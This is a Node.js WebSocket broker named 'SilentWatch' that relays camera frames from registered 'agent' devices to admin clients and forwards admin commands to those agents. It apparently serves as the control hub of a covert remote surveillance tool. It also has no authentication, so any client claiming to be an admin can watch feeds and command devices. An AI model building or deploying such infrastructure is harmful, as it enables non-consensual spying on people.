const WebSocket = require('ws');

const PORT = process.env.PORT || 8080;
const wss = new WebSocket.Server({ port: PORT });

console.log(`==================================================`);
console.log(`   SILENTWATCH WEBSOCKET BROKER STARTED          `);
console.log(`   Listening on port: ${PORT}                    `);
console.log(`==================================================`);

// Track connected clients
const admins = new Set();
const agents = new Map(); // agent_id -> socket

// Send updated agent list to all admins
function broadcastAgentList() {
    const list = Array.from(agents.keys()).map(id => ({ agent_id: id }));
    const payload = JSON.stringify({ type: 'agent_list', agents: list });
    
    admins.forEach(admin => {
        if (admin.readyState === WebSocket.OPEN) {
            admin.send(payload);
        }
    });
    console.log(`[Broker] Broadcasted agent list:`, list);
}

wss.on('connection', (ws) => {
    ws.isAlive = true;
    ws.role = null;
    ws.agentId = null;
    ws.watchingAgentId = null;

    console.log(`[Broker] New connection established.`);

    ws.on('message', (message, isBinary) => {
        // Handle binary data (camera frames)
        if (isBinary) {
            if (ws.role === 'agent' && ws.agentId) {
                // Relay image frame to all admins watching this agent
                let relayCount = 0;
                admins.forEach(admin => {
                    if (admin.watchingAgentId === ws.agentId && admin.readyState === WebSocket.OPEN) {
                        admin.send(message);
                        relayCount++;
                    }
                });
                // Throttled logging to prevent console flood
                if (Math.random() < 0.01) {
                    console.log(`[Broker] Relayed frame from agent [${ws.agentId}] to ${relayCount} admin(s) (${message.length} bytes)`);
                }
            }
            return;
        }

        // Handle JSON text messages
        try {
            const data = JSON.parse(message.toString());
            
            // 1. Client Registration Handshake
            if (data.role === 'admin') {
                ws.role = 'admin';
                admins.add(ws);
                console.log(`[Broker] Admin connected. Total admins: ${admins.size}`);
                
                // Immediately send list of active agents
                const list = Array.from(agents.keys()).map(id => ({ agent_id: id }));
                ws.send(JSON.stringify({ type: 'agent_list', agents: list }));
                return;
            }

            if (data.role === 'agent') {
                const agentId = data.agent_id || `device_${Math.random().toString(36).substr(2, 6)}`;
                ws.role = 'agent';
                ws.agentId = agentId;
                agents.set(agentId, ws);
                console.log(`[Broker] Agent [${agentId}] registered. Total agents: ${agents.size}`);
                
                broadcastAgentList();
                return;
            }

            // 2. Ping-Pong Heartbeat
            if (data.command === 'ping') {
                ws.send(JSON.stringify({ type: 'pong' }));
                return;
            }

            // 3. Admin-only Commands
            if (ws.role === 'admin') {
                // Command: Watch Agent
                if (data.command === 'watch_agent') {
                    ws.watchingAgentId = data.agent_id;
                    console.log(`[Broker] Admin is now watching Agent [${data.agent_id}]`);
                    ws.send(JSON.stringify({ type: 'watching', agent_id: data.agent_id }));
                    return;
                }

                // Command: Route other commands to specific agent
                const targetAgentId = data.agent_id;
                if (targetAgentId && agents.has(targetAgentId)) {
                    const agentSocket = agents.get(targetAgentId);
                    if (agentSocket.readyState === WebSocket.OPEN) {
                        // Strip agent_id to keep payload clean for agent
                        const forwardPayload = { ...data };
                        delete forwardPayload.agent_id;
                        
                        agentSocket.send(JSON.stringify(forwardPayload));
                        console.log(`[Broker] Routed command [${data.command}] from Admin to Agent [${targetAgentId}]`);
                    }
                } else {
                    console.log(`[Broker] Target agent [${targetAgentId}] not found for command [${data.command}]`);
                }
                return;
            }

            // 4. Agent-only Messages (Status, logs, notifications)
            if (ws.role === 'agent') {
                // Broadcast all status reports / notifications to all connected admins
                admins.forEach(admin => {
                    if (admin.readyState === WebSocket.OPEN) {
                        admin.send(JSON.stringify(data));
                    }
                });
                console.log(`[Broker] Relayed message [${data.type || 'unknown'}] from Agent [${ws.agentId}] to admins`);
                return;
            }

        } catch (err) {
            console.error('[Broker] Failed to parse JSON message:', err.message);
        }
    });

    ws.on('pong', () => {
        ws.isAlive = true;
    });

    ws.on('close', () => {
        if (ws.role === 'admin') {
            admins.delete(ws);
            console.log(`[Broker] Admin disconnected. Total admins: ${admins.size}`);
        } else if (ws.role === 'agent' && ws.agentId) {
            agents.delete(ws.agentId);
            console.log(`[Broker] Agent [${ws.agentId}] disconnected. Total agents: ${agents.size}`);
            broadcastAgentList();
        } else {
            console.log(`[Broker] Unregistered connection closed.`);
        }
    });
});

// Periodic connection health check (every 30 seconds)
const interval = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            console.log(`[Broker] Pruning inactive connection.`);
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

wss.on('close', () => {
    clearInterval(interval);
});
